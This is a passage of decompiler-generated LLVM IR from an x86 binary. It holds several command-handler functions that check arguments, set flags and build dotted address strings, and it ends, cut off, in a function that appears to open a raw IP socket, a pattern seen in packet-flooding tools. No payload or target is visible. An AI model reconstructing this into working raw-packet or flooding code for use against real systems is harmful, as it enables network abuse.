  ret i32 %v0_8048f4e

; uselistorder directives
  uselistorder i32 %storemerge78, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8048e7a, { 1, 0 }
  uselistorder i32 %v5_8048e6883, { 0, 4, 5, 6, 3, 1, 2 }
  uselistorder i32* %v2_8048eaa.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_8048e0e, { 1, 0, 2 }
  uselistorder i32 %v4_8048dfd, { 1, 2, 0 }
  uselistorder i32 %storemerge10.in89, { 0, 3, 2, 1 }
  uselistorder i1 %v0_8048d68, { 1, 0 }
  uselistorder i32 %v7_8048d66, { 1, 0 }
  uselistorder i32 %storemerge595, { 2, 0, 3, 1 }
  uselistorder i32 %v4_8048d0c, { 1, 0 }
  uselistorder i32 %v5_8048cfa100, { 7, 8, 3, 0, 2, 1, 9, 10, 6, 4, 5 }
  uselistorder i32 %v2_8048cea, { 3, 1, 4, 2, 5, 0 }
  uselistorder i32 %v3_8048cd2, { 11, 10, 9, 8, 0, 1, 2, 6, 3, 5, 4, 7 }
  uselistorder i32 %v1_8048bad, { 1, 0, 2 }
  uselistorder i32 %storemerge6, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8048b4c.pre-phi, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v2_8048b29, { 2, 0, 1 }
  uselistorder i1 %v0_8048af1, { 1, 0 }
  uselistorder i32 %v4_8048a86, { 3, 4, 2, 5, 1, 6, 7, 0, 8 }
  uselistorder i32 %v4_8048a43, { 1, 0 }
  uselistorder i32* %stack_var_-1096, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1, 2 }
  uselistorder i1* %cf.global-to-local, { 21, 24, 22, 23, 2, 25, 26, 3, 27, 34, 30, 28, 29, 4, 31, 32, 33, 1, 35, 36, 0, 37, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 -1092, { 1, 0 }
  uselistorder i32 %arg4, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048f45, { 1, 0 }
  uselistorder label %dec_label_pc_8048f0f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048e7a, { 1, 0 }
  uselistorder label %dec_label_pc_8048e22, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048dfd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048d85, { 1, 0 }
  uselistorder label %dec_label_pc_8048d2c, { 1, 0 }
  uselistorder label %dec_label_pc_8048d0c, { 1, 0 }
  uselistorder label %dec_label_pc_8048c74, { 1, 0 }
  uselistorder label %dec_label_pc_8048c1d, { 1, 0 }
  uselistorder label %dec_label_pc_8048bf8, { 1, 0 }
  uselistorder label %dec_label_pc_8048b49, { 1, 0 }
  uselistorder label %dec_label_pc_8048b3d, { 1, 0 }
  uselistorder label %dec_label_pc_8048aba, { 1, 0 }
  uselistorder label %dec_label_pc_8048a6f, { 1, 0 }
}

define i32 @function_8048f4f(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048f4f:
  %tmp33 = call i8 @__decompiler_undefined_function_5()
  %tmp34 = call i8 @__decompiler_undefined_function_5()
  %v0_8048f58 = load i8*, i8** @global_var_80564a8.11, align 4
  %v1_8048f58 = ptrtoint i8* %v0_8048f58 to i32
  %v0_8048f60 = load i64, i64* @global_var_80564ac.12, align 8
  %v1_8048f60 = trunc i64 %v0_8048f60 to i32
  %v9_8048f77 = icmp eq i32 %v1_8048f60, 1
  %v1_8048f7a = icmp eq i1 %v9_8048f77, false
  br i1 %v1_8048f7a, label %dec_label_pc_8048fd6, label %dec_label_pc_8048f7c

dec_label_pc_8048f7c:                             ; preds = %dec_label_pc_8048f4f
  %v1_8048f82 = urem i32 %v1_8048f58, 256
  store i32 %v1_8048f82, i32* @ebx, align 4
  %v3_8048fcc = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_8052af0.27 to i32))
  br label %dec_label_pc_8049072

dec_label_pc_8048fd6:                             ; preds = %dec_label_pc_8048f4f
  %v3_8048fef17 = zext i8 %tmp34 to i32
  store i32 %v3_8048fef17, i32* @ebx, align 4
  %v3_8048ffb18 = zext i8 %tmp33 to i32
  store i32 %v3_8048ffb18, i32* @esi, align 4
  %v1_8049007 = urem i32 %v1_8048f58, 256
  store i32 %v1_8049007, i32* @edi, align 4
  %v3_804906d = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_8052b10.28 to i32))
  br label %dec_label_pc_8049072

dec_label_pc_8049072:                             ; preds = %dec_label_pc_8048f7c, %dec_label_pc_8048fd6
  %storemerge = phi i32 [ %v3_804906d, %dec_label_pc_8048fd6 ], [ %v3_8048fcc, %dec_label_pc_8048f7c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049072, { 1, 0 }
}

define i32 @function_804907a(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804907a:
  %stack_var_-4 = alloca i32, align 4
  %v0_804907a = load i32, i32* @ebp, align 4
  store i32 %v0_804907a, i32* %stack_var_-4, align 4
  %v4_804907a = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804907a, i32* @ebp, align 4
  %v3_8049095 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_8052b3e.29 to i32))
  ret i32 %v3_8049095

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_804909c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804909c:
  %v12_80490a3 = icmp eq i32 %arg3, 1
  br i1 %v12_80490a3, label %dec_label_pc_80490c5, label %dec_label_pc_80490a9

dec_label_pc_80490a9:                             ; preds = %dec_label_pc_804909c
  %v3_80490be = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_8052b5b.30 to i32))
  br label %dec_label_pc_8049122

dec_label_pc_80490c5:                             ; preds = %dec_label_pc_804909c
  %v1_80490c8 = add i32 %arg4, 4
  %v1_80490cb = inttoptr i32 %v1_80490c8 to i32*
  %v2_80490cb = load i32, i32* %v1_80490cb, align 4
  store i1 false, i1* @df, align 1
  %v4_80490d8 = inttoptr i32 %v2_80490cb to i8*
  store i32 %v2_80490cb, i32* @edi, align 4
  %v3_80490db = call i32 @_strlen(i8* %v4_80490d8)
  %v4_80490db = mul i32 %v3_80490db, -1
  %v1_80490e1 = sub i32 0, %v4_80490db
  %v5_80490e2 = icmp ult i32 %v1_80490e1, 9
  %v9_80490e2 = icmp eq i32 %v4_80490db, -9
  %v2_80490e5 = or i1 %v5_80490e2, %v9_80490e2
  br i1 %v2_80490e5, label %dec_label_pc_8049103, label %dec_label_pc_80490e7

dec_label_pc_80490e7:                             ; preds = %dec_label_pc_80490c5
  %v3_80490fc = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_8052b74.31 to i32))
  br label %dec_label_pc_8049122

dec_label_pc_8049103:                             ; preds = %dec_label_pc_80490c5
  %v3_804911d = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_8052ba9.32 to i32))
  br label %dec_label_pc_8049122

dec_label_pc_8049122:                             ; preds = %dec_label_pc_80490e7, %dec_label_pc_80490a9, %dec_label_pc_8049103
  %v0_8049127 = phi i32 [ %v3_80490fc, %dec_label_pc_80490e7 ], [ %v3_80490be, %dec_label_pc_80490a9 ], [ %v3_804911d, %dec_label_pc_8049103 ]
  ret i32 %v0_8049127

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049122, { 2, 0, 1 }
}

define i32 @function_8049128(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8049128:
  %v12_804912f = icmp eq i32 %arg3, 1
  br i1 %v12_804912f, label %dec_label_pc_8049190, label %dec_label_pc_8049135

dec_label_pc_8049135:                             ; preds = %dec_label_pc_8049128
  %v3_804914a = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_8052bb2.33 to i32))
  %v3_8049186 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_8052bf4.36 to i32))
  br label %dec_label_pc_804924a

dec_label_pc_8049190:                             ; preds = %dec_label_pc_8049128
  %v0_8049190 = load i8, i8* @global_var_80564a4.6, align 4
  %v4_8049197 = icmp eq i8 %v0_8049190, 0
  br i1 %v4_8049197, label %dec_label_pc_80491ba, label %dec_label_pc_804919b

dec_label_pc_804919b:                             ; preds = %dec_label_pc_8049190
  %v3_80491b0 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_8052c17.37 to i32))
  br label %dec_label_pc_804924a

dec_label_pc_80491ba:                             ; preds = %dec_label_pc_8049190
  %v1_80491bd = add i32 %arg4, 4
  %v1_80491c0 = inttoptr i32 %v1_80491bd to i32*
  %v2_80491c0 = load i32, i32* %v1_80491c0, align 4
  store i1 false, i1* @df, align 1
  %v4_80491cd = inttoptr i32 %v2_80491c0 to i8*
  store i32 %v2_80491c0, i32* @edi, align 4
  %v3_80491d0 = call i32 @_strlen(i8* %v4_80491cd)
  %v4_80491d0 = mul i32 %v3_80491d0, -1
  %v1_80491d6 = sub i32 0, %v4_80491d0
  %v5_80491d7 = icmp ult i32 %v1_80491d6, 254
  %v9_80491d7 = icmp eq i32 %v4_80491d0, -254
  %v2_80491dc = or i1 %v5_80491d7, %v9_80491d7
  br i1 %v2_80491dc, label %dec_label_pc_80491fa, label %dec_label_pc_80491de

dec_label_pc_80491de:                             ; preds = %dec_label_pc_80491ba
  %v3_80491f3 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_8052c38.38 to i32))
  br label %dec_label_pc_804924a

dec_label_pc_80491fa:                             ; preds = %dec_label_pc_80491ba
  store i8 1, i8* @global_var_80564a4.6, align 4
  %v5_804921a = call i32 @function_804d4e0(i8* bitcast (i32* @global_var_8058b60.39 to i8*), i32 0, i32 256)
  %v2_8049225 = load i32, i32* %v1_80491c0, align 4
  store i32 %v2_8049225, i32* @eax, align 4
  %v4_8049232 = call i32 @function_804d4f8(i8* bitcast (i32* @global_var_8058b60.39 to i8*), i32 %v2_8049225)
  %v3_8049245 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_8052c60.40 to i32))
  br label %dec_label_pc_804924a

dec_label_pc_804924a:                             ; preds = %dec_label_pc_80491de, %dec_label_pc_804919b, %dec_label_pc_8049135, %dec_label_pc_80491fa
  %v0_804924f = phi i32 [ %v3_80491f3, %dec_label_pc_80491de ], [ %v3_80491b0, %dec_label_pc_804919b ], [ %v3_8049186, %dec_label_pc_8049135 ], [ %v3_8049245, %dec_label_pc_80491fa ]
  ret i32 %v0_804924f

; uselistorder directives
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804924a, { 3, 0, 1, 2 }
}

define i32 @function_8049250(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8049250:
  %v12_8049256 = icmp eq i32 %arg3, 1
  br i1 %v12_8049256, label %dec_label_pc_80492b7, label %dec_label_pc_804925c

dec_label_pc_804925c:                             ; preds = %dec_label_pc_8049250
  %v3_8049271 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_8052c7f.41 to i32))
  %v3_80492ad = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_8052bf4.36 to i32))
  br label %dec_label_pc_8049337

dec_label_pc_80492b7:                             ; preds = %dec_label_pc_8049250
  %v0_80492b7 = load i8, i8* @global_var_80564a4.6, align 4
  %v4_80492be = icmp eq i8 %v0_80492b7, 0
  %v1_80492c0 = icmp eq i1 %v4_80492be, false
  br i1 %v1_80492c0, label %dec_label_pc_80492de, label %dec_label_pc_80492c2

dec_label_pc_80492c2:                             ; preds = %dec_label_pc_80492b7
  %v3_80492d7 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_8052c99.42 to i32))
  br label %dec_label_pc_8049337

dec_label_pc_80492de:                             ; preds = %dec_label_pc_80492b7
  %v1_80492e1 = add i32 %arg4, 4
  %v1_80492e4 = inttoptr i32 %v1_80492e1 to i32*
  %v2_80492e4 = load i32, i32* %v1_80492e4, align 4
  %v4_80492f1 = call i32 @function_804d65c(i8* bitcast (i32* @global_var_8058b60.39 to i8*), i32 %v2_80492e4)
  %v1_80492f6 = icmp eq i32 %v4_80492f1, 0
  br i1 %v1_80492f6, label %dec_label_pc_8049316, label %dec_label_pc_80492fa

dec_label_pc_80492fa:                             ; preds = %dec_label_pc_80492de
  %v3_804930f = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_8052cb6.43 to i32))
  br label %dec_label_pc_8049337

dec_label_pc_8049316:                             ; preds = %dec_label_pc_80492de
  store i8 0, i8* @global_var_80564a4.6, align 4
  %v3_8049332 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_8052cd1.44 to i32))
  br label %dec_label_pc_8049337

dec_label_pc_8049337:                             ; preds = %dec_label_pc_80492fa, %dec_label_pc_80492c2, %dec_label_pc_804925c, %dec_label_pc_8049316
  %v0_8049338 = phi i32 [ %v3_804930f, %dec_label_pc_80492fa ], [ %v3_80492d7, %dec_label_pc_80492c2 ], [ %v3_80492ad, %dec_label_pc_804925c ], [ %v3_8049332, %dec_label_pc_8049316 ]
  ret i32 %v0_8049338

; uselistorder directives
  uselistorder i8* @global_var_80564a4.6, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049337, { 3, 0, 1, 2 }
}

define i32 @function_8049339(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8049339:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %v12_8049343 = icmp eq i32 %arg3, 1
  br i1 %v12_8049343, label %dec_label_pc_804937c, label %dec_label_pc_8049349

dec_label_pc_8049349:                             ; preds = %dec_label_pc_8049339
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_804935e = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_8052cf0.45 to i32))
  store i32 %v3_804935e, i32* %eax.global-to-local, align 4
  store i8* null, i8** @global_var_80564a8.11, align 8
  store i64 0, i64* @global_var_80564ac.12, align 8
  br label %dec_label_pc_8049517

dec_label_pc_804937c:                             ; preds = %dec_label_pc_8049339
  %v1_804937f = add i32 %arg4, 4
  store i32 %v1_804937f, i32* %eax.global-to-local, align 4
  %v1_8049382 = inttoptr i32 %v1_804937f to i32*
  %v2_8049382 = load i32, i32* %v1_8049382, align 4
  %v1_804938f = and i32 %v2_8049382, -256
  store i32 %v1_804938f, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8049392 = inttoptr i32 %v2_8049382 to i8*
  store i32 %v2_8049382, i32* @edi, align 4
  %v3_8049398 = call i32 @_strlen(i8* %v4_8049392)
  %v4_8049398 = mul i32 %v3_8049398, -1
  %v1_804939e = sub i32 0, %v4_8049398
  store i32 %v1_804939e, i32* %eax.global-to-local, align 4
  %v2_804939f = icmp ult i32 %v1_804939e, 16
  %v6_804939f = icmp eq i32 %v4_8049398, -16
  %v2_80493a2 = or i1 %v2_804939f, %v6_804939f
  br i1 %v2_80493a2, label %dec_label_pc_80493c3, label %dec_label_pc_80493a4

dec_label_pc_80493a4:                             ; preds = %dec_label_pc_804937c
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_80493b9 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_8052d10.46 to i32))
  store i32 %v3_80493b9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049517

dec_label_pc_80493c3:                             ; preds = %dec_label_pc_804937c
  store i32 %v1_804937f, i32* %eax.global-to-local, align 4
  %v2_80493c9 = load i32, i32* %v1_8049382, align 4
  %v2_80493cf = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_80493cf, i32* @eax, align 4
  %v3_80493d8 = bitcast i32* %stack_var_-276 to i8*
  %v4_80493d8 = call i32 @function_804d4f8(i8* %v3_80493d8, i32 %v2_80493c9)
  %v2_80493ee = ptrtoint i32* %stack_var_-512 to i32
  store i32 %v2_80493ee, i32* %eax.global-to-local, align 4
  %v3_80493f7 = call i32 @_strlen(i8* %v3_80493d8)
  %v1_80493fe = add i32 %v3_80493f7, -1
  store i32 %v1_80493fe, i32* %eax.global-to-local, align 4
  %v0_80493ff = load i32, i32* @ebp, align 4
  %v2_80493ff = add i32 %v3_80493f7, -273
  %v3_80493ff = add i32 %v2_80493ff, %v0_80493ff
  %v4_80493ff = inttoptr i32 %v3_80493ff to i8*
  %v5_80493ff = load i8, i8* %v4_80493ff, align 1
  %v6_80493ff = zext i8 %v5_80493ff to i32
  store i32 %v6_80493ff, i32* %eax.global-to-local, align 4
  %v10_8049407 = icmp eq i8 %v5_80493ff, 46
  %v1_8049409 = icmp eq i1 %v10_8049407, false
  br i1 %v1_8049409, label %dec_label_pc_804945a, label %dec_label_pc_804940b

dec_label_pc_804940b:                             ; preds = %dec_label_pc_80493c3
  store i32 %v2_80493ee, i32* %eax.global-to-local, align 4
  %v3_8049425 = call i32 @_strlen(i8* %v3_80493d8)
  %v1_804942c = add i32 %v3_8049425, -1
  store i32 %v1_804942c, i32* %eax.global-to-local, align 4
  %v0_804942d = load i32, i32* @ebp, align 4
  %v2_804942d = add i32 %v3_8049425, -273
  %v3_804942d = add i32 %v2_804942d, %v0_804942d
  %v4_804942d = inttoptr i32 %v3_804942d to i8*
  store i8 0, i8* %v4_804942d, align 1
  br label %dec_label_pc_804945a

dec_label_pc_8049445:                             ; preds = %dec_label_pc_804945a
  store i32 %stack_var_-20.0, i32* %eax.global-to-local, align 4
  %v0_8049448 = load i32, i32* @ebp, align 4
  %v2_8049448 = add i32 %stack_var_-20.0, -272
  %v3_8049448 = add i32 %v2_8049448, %v0_8049448
  %v4_8049448 = inttoptr i32 %v3_8049448 to i8*
  %v5_8049448 = load i8, i8* %v4_8049448, align 1
  %v6_8049448 = zext i8 %v5_8049448 to i32
  store i32 %v6_8049448, i32* %eax.global-to-local, align 4
  %v10_8049450 = icmp eq i8 %v5_8049448, 46
  %v1_8049452 = icmp eq i1 %v10_8049450, false
  br i1 %v1_8049452, label %dec_label_pc_8049457, label %dec_label_pc_8049454

dec_label_pc_8049454:                             ; preds = %dec_label_pc_8049445
  %v4_8049454 = add i32 %stack_var_-16.1, 1
  br label %dec_label_pc_8049457

dec_label_pc_8049457:                             ; preds = %dec_label_pc_8049445, %dec_label_pc_8049454
  %stack_var_-16.0 = phi i32 [ %stack_var_-16.1, %dec_label_pc_8049445 ], [ %v4_8049454, %dec_label_pc_8049454 ]
  %v4_8049457 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_804945a

dec_label_pc_804945a:                             ; preds = %dec_label_pc_804940b, %dec_label_pc_80493c3, %dec_label_pc_8049457
  %stack_var_-16.1 = phi i32 [ %stack_var_-16.0, %dec_label_pc_8049457 ], [ 1, %dec_label_pc_80493c3 ], [ 1, %dec_label_pc_804940b ]
  %stack_var_-20.0 = phi i32 [ %v4_8049457, %dec_label_pc_8049457 ], [ 0, %dec_label_pc_80493c3 ], [ 0, %dec_label_pc_804940b ]
  store i32 %stack_var_-20.0, i32* @edx, align 4
  store i32 %v2_80493ee, i32* %eax.global-to-local, align 4
  %v3_8049477 = call i32 @_strlen(i8* %v3_80493d8)
  store i32 %v3_8049477, i32* %eax.global-to-local, align 4
  %v0_804947e = load i32, i32* @edx, align 4
  %v7_804947e = icmp ult i32 %v0_804947e, %v3_8049477
  br i1 %v7_804947e, label %dec_label_pc_8049445, label %dec_label_pc_8049482

dec_label_pc_8049482:                             ; preds = %dec_label_pc_804945a
  %v5_8049487 = sub i32 4, %stack_var_-16.1
  %v15_8049487 = icmp eq i32 %v5_8049487, 0
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_80494d227 = icmp sgt i32 %v5_8049487, 0
  br i1 %v5_80494d227, label %dec_label_pc_8049496, label %dec_label_pc_80494d4

dec_label_pc_8049496:                             ; preds = %dec_label_pc_8049482, %dec_label_pc_8049496
  %storemerge228 = phi i32 [ %v4_80494c9, %dec_label_pc_8049496 ], [ 0, %dec_label_pc_8049482 ]
  store i32 %v2_80493cf, i32* @edx, align 4
  store i32 %v2_80493ee, i32* %eax.global-to-local, align 4
  %v3_80494b6 = call i32 @_strlen(i8* %v3_80493d8)
  %v0_80494bd = load i32, i32* @edx, align 4
  %v0_80494bd29 = add i32 %v0_80494bd, %v3_80494b6
  store i32 %v0_80494bd29, i32* %eax.global-to-local, align 4
  %v1_80494c0 = inttoptr i32 %v0_80494bd29 to i16*
  store i16 12334, i16* %v1_80494c0, align 2
  %v0_80494c5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80494c5 = add i32 %v0_80494c5, 2
  %v2_80494c5 = inttoptr i32 %v1_80494c5 to i8*
  store i8 0, i8* %v2_80494c5, align 1
  %v4_80494c9 = add nuw nsw i32 %storemerge228, 1
  store i32 %v4_80494c9, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_80494c9, %v5_8049487
  br i1 %exitcond, label %dec_label_pc_80494d4, label %dec_label_pc_8049496

dec_label_pc_80494d4:                             ; preds = %dec_label_pc_8049496, %dec_label_pc_8049482
  store i32 %v2_80493cf, i32* @eax, align 4
  %v2_80494dd = call i32 @function_804d7a0(i8* %v3_80493d8)
  store i32 %v2_80494dd, i32* %eax.global-to-local, align 4
  %v1_80494e9 = icmp eq i1 %v15_8049487, false
  br i1 %v1_80494e9, label %dec_label_pc_80494f7, label %dec_label_pc_804950f

dec_label_pc_80494f7:                             ; preds = %dec_label_pc_80494d4
  store i32 %v5_8049487, i32* %eax.global-to-local, align 4
  %v4_8049505 = call i32 @function_8048965(i64 256, i32 %v5_8049487)
  store i32 %v4_8049505, i32* %eax.global-to-local, align 4
  %v1_804950a = sext i32 %v4_8049505 to i64
  br label %dec_label_pc_804950f

dec_label_pc_804950f:                             ; preds = %dec_label_pc_80494d4, %dec_label_pc_80494f7
  %storemerge = phi i64 [ %v1_804950a, %dec_label_pc_80494f7 ], [ 1, %dec_label_pc_80494d4 ]
  store i64 %storemerge, i64* @global_var_80564ac.12, align 8
  store i32 %v2_80494dd, i32* %eax.global-to-local, align 4
  %v1_8049512 = inttoptr i32 %v2_80494dd to i8*
  store i8* %v1_8049512, i8** @global_var_80564a8.11, align 8
  br label %dec_label_pc_8049517

dec_label_pc_8049517:                             ; preds = %dec_label_pc_80493a4, %dec_label_pc_8049349, %dec_label_pc_804950f
  %v0_804951f = phi i32 [ %v3_80493b9, %dec_label_pc_80493a4 ], [ %v3_804935e, %dec_label_pc_8049349 ], [ %v2_80494dd, %dec_label_pc_804950f ]
  ret i32 %v0_804951f

; uselistorder directives
  uselistorder i32 %v2_80494dd, { 0, 2, 1, 3 }
  uselistorder i32 %v4_80494c9, { 1, 2, 0 }
  uselistorder i32 %v5_8049487, { 3, 2, 0, 1, 4 }
  uselistorder i32 %stack_var_-20.0, { 3, 2, 0, 1 }
  uselistorder i32 %v2_80493ee, { 1, 2, 0, 3 }
  uselistorder i8* %v3_80493d8, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_80493cf, { 1, 0, 2 }
  uselistorder i32 %v1_804939e, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 3, 2, 6, 8, 4, 5, 7, 0, 11, 12, 9, 10, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 25, 24 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049517, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804950f, { 1, 0 }
  uselistorder label %dec_label_pc_8049496, { 1, 0 }
  uselistorder label %dec_label_pc_804945a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049457, { 1, 0 }
}

define i32 @function_8049520(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8049520:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049520 = load i32, i32* @ebp, align 4
  store i32 %v0_8049520, i32* %stack_var_-4, align 4
  %v4_8049520 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049520, i32* @ebp, align 4
  %v1_804952c = call i32 @function_804d880(i32 %arg2)
  store i32 %v1_804952c, i32* @global_var_80568c0.47, align 64
  %v10_804953b = icmp eq i32 %v1_804952c, -1
  %v1_804953e = icmp eq i1 %v10_804953b, false
  br i1 %v1_804953e, label %dec_label_pc_80495a8, label %dec_label_pc_8049540

dec_label_pc_8049540:                             ; preds = %dec_label_pc_8049520
  %v1_8049546 = call i32 @function_804d8a8(i32 %arg2)
  %v4_804954e = icmp eq i32 %v1_8049546, 0
  %v1_8049552 = icmp eq i1 %v4_804954e, false
  br i1 %v1_8049552, label %dec_label_pc_8049583, label %dec_label_pc_8049554

dec_label_pc_8049554:                             ; preds = %dec_label_pc_8049540
  %v0_8049554 = load i32, i32* @global_var_8058c68.7, align 8
  %v2_8049572 = call i32 @function_80482b3(i32 %v0_8049554, i32 ptrtoint ([33 x i8]* @global_var_8052d5c.48 to i32))
  store i32 %v2_8049572, i32* @eax, align 4
  %v1_804957e = call i32 @function_804f274(i32 0)
  br label %dec_label_pc_8049583

dec_label_pc_8049583:                             ; preds = %dec_label_pc_8049540, %dec_label_pc_8049554
  %v1_8049586 = add i32 %v1_8049546, 12
  %v2_8049586 = inttoptr i32 %v1_8049586 to i32*
  %v3_8049586 = load i32, i32* %v2_8049586, align 4
  %v1_8049593 = add i32 %v1_8049546, 16
  %v2_8049593 = inttoptr i32 %v1_8049593 to i32*
  %v3_8049593 = load i32, i32* %v2_8049593, align 4
  %v1_8049596 = inttoptr i32 %v3_8049593 to i32*
  %v2_8049596 = load i32, i32* %v1_8049596, align 4
  %v3_80495a3 = call i32 @function_804d644(i32 %v2_8049596, i32 ptrtoint (i32* @global_var_80568c0.47 to i32), i32 %v3_8049586)
  %v0_80495a8.pre = load i32, i32* @global_var_80568c0.47, align 64
  br label %dec_label_pc_80495a8

dec_label_pc_80495a8:                             ; preds = %dec_label_pc_8049520, %dec_label_pc_8049583
  %v0_80495a8 = phi i32 [ %v1_804952c, %dec_label_pc_8049520 ], [ %v0_80495a8.pre, %dec_label_pc_8049583 ]
  %v2_80495ad = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80495ad, i32* @ebp, align 4
  ret i32 %v0_80495a8

; uselistorder directives
  uselistorder i32 %v1_804952c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80495a8, { 1, 0 }
  uselistorder label %dec_label_pc_8049583, { 1, 0 }
}

define i32 @function_80495af(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80495af:
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-1532 = alloca i32, align 4
  %stack_var_-1540 = alloca i32, align 4
  %stack_var_-1560 = alloca i32, align 4
  %stack_var_-1596 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80495af = load i32, i32* @ebp, align 4
  store i32 %v0_80495af, i32* %stack_var_-4, align 4
  %v4_80495af = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80495af, i32* @ebp, align 4
  store i32 0, i32* %stack_var_-1596, align 4
  %v2_80495c6 = call i32 @function_804ba00(i32* null)
  store i32 %arg2, i32* %stack_var_-1596, align 4
  %v1_80495d4 = call i32 @function_8048311(i32 %arg2)
  %v1_80495d9 = icmp eq i32 %v1_80495d4, 0
  %v1_80495db = icmp eq i1 %v1_80495d9, false
  br i1 %v1_80495db, label %dec_label_pc_804985d, label %dec_label_pc_80495e1

dec_label_pc_80495e1:                             ; preds = %dec_label_pc_80495af
  store i32 2, i32* %stack_var_-1596, align 4
  %v4_80495f8 = call i32 @function_804dd68(i32 2, i32 3, i32 255)
  store i32 %v4_80495f8, i32* @eax, align 4
  %v5_8049600 = icmp slt i32 %v4_80495f8, 0
  %v1_8049604 = icmp eq i1 %v5_8049600, false
  br i1 %v1_8049604, label %dec_label_pc_8049612, label %dec_label_pc_8049606

dec_label_pc_8049606:                             ; preds = %dec_label_pc_80495e1
  store i32 1, i32* %stack_var_-1596, align 4
  %v1_804960d = call i32 @function_804f274(i32 1)
  br label %dec_label_pc_8049612

dec_label_pc_8049612:                             ; preds = %dec_label_pc_80495e1, %dec_label_pc_8049606
  %v4_8049612 = add i32 %arg3, -2
  %v9_8049612 = sub i32 1, %arg3
  %v10_8049612 = and i32 %v9_8049612, %arg3
  %v11_8049612 = icmp slt i32 %v10_8049612, 0
  %v12_8049612 = icmp eq i32 %v4_8049612, 0
  %v13_8049612 = icmp slt i32 %v4_8049612, 0
